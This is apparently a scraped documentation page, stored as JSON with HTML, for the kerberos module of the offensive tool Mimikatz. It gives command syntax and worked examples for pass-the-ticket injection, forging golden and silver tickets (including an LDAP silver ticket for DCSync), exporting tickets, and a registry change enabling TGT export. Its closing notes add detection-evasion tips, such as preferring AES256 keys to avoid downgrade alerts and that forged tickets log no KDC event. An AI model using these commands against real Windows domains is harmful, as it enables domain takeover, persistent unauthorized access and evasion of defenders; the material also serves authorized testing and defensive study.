{"title": "kerberos", "source": "mimikatz", "source_label": "Mimikatz", "path": "kerberos", "html": "<h1 id=\"kerberos\">kerberos</h1>\n<p>Interact with Kerberos tickets using the official Microsoft Kerberos API. No elevated privileges required for most commands. Used for Pass-the-Ticket and forging golden/silver tickets.</p>\n<hr>\n<h2 id=\"ptt-pass-the-ticket\">ptt — Pass-the-Ticket</h2>\n<p>Inject one or more Kerberos tickets into the current session.</p>\n<div class=\"highlight\"><pre><span></span><code>mimikatz # kerberos::ptt &lt;ticket.kirbi&gt;\nmimikatz # kerberos::ptt &lt;directory\\&gt;\n</code></pre></div>\n<h3 id=\"options\">Options</h3>\n<ul>\n<li><code>&lt;ticket.kirbi&gt;</code> — single ticket file path (or multiple space-separated)</li>\n<li><code>&lt;directory&gt;</code> — directory containing <code>.kirbi</code> files for batch injection</li>\n</ul>\n<h3 id=\"examples\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code>mimikatz # kerberos::ptt Administrator@krbtgt-&lt;domain&gt;.kirbi\nTicket &#39;Administrator@krbtgt-&lt;domain&gt;.kirbi&#39; successfully submitted for current session\n\n# Inject all tickets from a directory\nmimikatz # kerberos::ptt C:\\temp\\tickets\\\n</code></pre></div>\n<hr>\n<h2 id=\"golden-silver-forge-tickets\">golden / silver — Forge Tickets</h2>\n<p>Create arbitrary Kerberos TGT (golden) or service ticket (silver) with custom user/group membership.</p>\n<div class=\"highlight\"><pre><span></span><code>mimikatz # kerberos::golden /user:&lt;username&gt; /domain:&lt;domain&gt; /sid:&lt;sid&gt; /krbtgt:&lt;nt-hash&gt; [/id:&lt;user-id&gt;] [/groups:&lt;group-ids&gt;] [/ticket:&lt;output&gt;.kirbi] [/ptt] [/startoffset:&lt;min&gt;] [/endin:&lt;min&gt;] [/renewmax:&lt;min&gt;] [/aes128:&lt;aes128-key&gt;] [/aes256:&lt;aes256-key&gt;]\n</code></pre></div>\n<h3 id=\"options-all-golden-and-silver\">Options — All (golden and silver)</h3>\n<ul>\n<li><code>/user:&lt;username&gt;</code> — username to embed in ticket</li>\n<li><code>/domain:&lt;domain&gt;</code> — fully qualified domain name (e.g. <code>corp.local</code>)</li>\n<li><code>/sid:&lt;sid&gt;</code> — domain SID (e.g. <code>S-1-5-21-...</code>)</li>\n<li><code>/krbtgt:&lt;nt-hash&gt;</code> — krbtgt NTLM hash (alias: <code>/rc4</code>)</li>\n<li><code>/rc4:&lt;rc4&gt;</code> — RC4/NTLM hash</li>\n<li><code>/aes128:&lt;aes128-key&gt;</code> — AES128 encryption key</li>\n<li><code>/aes256:&lt;aes256-key&gt;</code> — AES256 encryption key (preferred)</li>\n<li><code>/id:&lt;user-id&gt;</code> — user RID (default: 500 / Administrator)</li>\n<li><code>/groups:&lt;group-ids&gt;</code> — comma-separated group RIDs (default: <code>513,512,520,518,519</code>)</li>\n<li><code>/ticket:&lt;output&gt;.kirbi</code> — output file (default: <code>ticket.kirbi</code>)</li>\n<li><code>/ptt</code> — inject directly into current session</li>\n<li><code>/startoffset:&lt;min&gt;</code> — ticket start offset in minutes (negative = past)</li>\n<li><code>/endin:&lt;min&gt;</code> — ticket duration in minutes</li>\n<li><code>/renewmax:&lt;min&gt;</code> — max renewal duration in minutes</li>\n</ul>\n<h3 id=\"options-silver-ticket-only\">Options — Silver Ticket Only</h3>\n<ul>\n<li><code>/target:&lt;hostname&gt;</code> — target server hostname</li>\n<li><code>/service:&lt;svc&gt;</code> — service name: <code>cifs</code>, <code>http</code>, <code>mssql</code>, <code>rpcss</code>, <code>host</code>, <code>ldap</code>, etc.</li>\n</ul>\n<h3 id=\"examples_1\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code># Golden ticket (RC4)\nmimikatz # kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;sid&gt; /krbtgt:&lt;nt-hash&gt; /ptt\n\n# Golden ticket (AES256, stealthier)\nmimikatz # kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;sid&gt; /aes256:&lt;aes256-key&gt; /ptt\n\n# Golden ticket with custom group membership + extra SID (cross-domain)\nmimikatz # kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;sid&gt; /krbtgt:&lt;nt-hash&gt; /groups:512,513,519 /sids:&lt;parent-domain-sid&gt;-519 /ptt\n\n# Silver ticket (cifs)\nmimikatz # kerberos::golden /user:&lt;username&gt; /domain:&lt;domain&gt; /sid:&lt;sid&gt; /target:&lt;computer&gt;.&lt;domain&gt; /service:cifs /rc4:&lt;rc4&gt; /ptt\n\n# Silver ticket (ldap — for DCSync)\nmimikatz # kerberos::golden /user:&lt;username&gt; /domain:&lt;domain&gt; /sid:&lt;sid&gt; /target:&lt;dc&gt;.&lt;domain&gt; /service:ldap /rc4:&lt;rc4&gt; /ptt\n\n# Save to file\nmimikatz # kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;sid&gt; /krbtgt:&lt;nt-hash&gt; /ticket:&lt;output&gt;.kirbi\n</code></pre></div>\n<hr>\n<h2 id=\"tgt-display-current-tgt\">tgt — Display Current TGT</h2>\n<p>Show TGT information for the current session.</p>\n<div class=\"highlight\"><pre><span></span><code>mimikatz # kerberos::tgt\n</code></pre></div>\n<p><strong>Note:</strong> Null session keys indicate <code>allowtgtsessionkey</code> registry value is 0. Set it to 1 to enable TGT export:<br>\n<div class=\"highlight\"><pre><span></span><code>reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters /v AllowTGTSessionKey /t REG_DWORD /d 1\n</code></pre></div></p>\n<hr>\n<h2 id=\"list-list-tickets\">list — List Tickets</h2>\n<p>Enumerate and optionally export current session's Kerberos tickets.</p>\n<div class=\"highlight\"><pre><span></span><code>mimikatz # kerberos::list [/export]\n</code></pre></div>\n<ul>\n<li><code>/export</code> — save all tickets as <code>.kirbi</code> files in current directory</li>\n</ul>\n<hr>\n<h2 id=\"purge-remove-all-tickets\">purge — Remove All Tickets</h2>\n<p>Remove all Kerberos tickets from the current session.</p>\n<div class=\"highlight\"><pre><span></span><code>mimikatz # kerberos::purge\nTicket(s) purge for current session is OK\n</code></pre></div>\n<hr>\n<h2 id=\"notes\">Notes</h2>\n<ul>\n<li>Golden tickets bypass password changes — krbtgt hash must be rotated <strong>twice</strong> to invalidate</li>\n<li>Golden tickets are not issued by the real KDC — no authentication event is logged at ticket creation</li>\n<li>Use AES256 keys over RC4 to avoid encryption downgrade detection events</li>\n<li>Silver tickets only require the service account's hash (not krbtgt) — more targeted, lower noise</li>\n<li>After injection with <code>/ptt</code> or <code>kerberos::ptt</code>, use <code>klist</code> (built-in) to verify</li>\n</ul>", "excerpt": "kerberos Interact with Kerberos tickets using the official Microsoft Kerberos API. No elevated privileges required for most commands. Used for Pass-the-Ticket and forging golden/silver tickets. ptt — Pass-the-Ticket Inject one or more Kerberos…", "tags": []}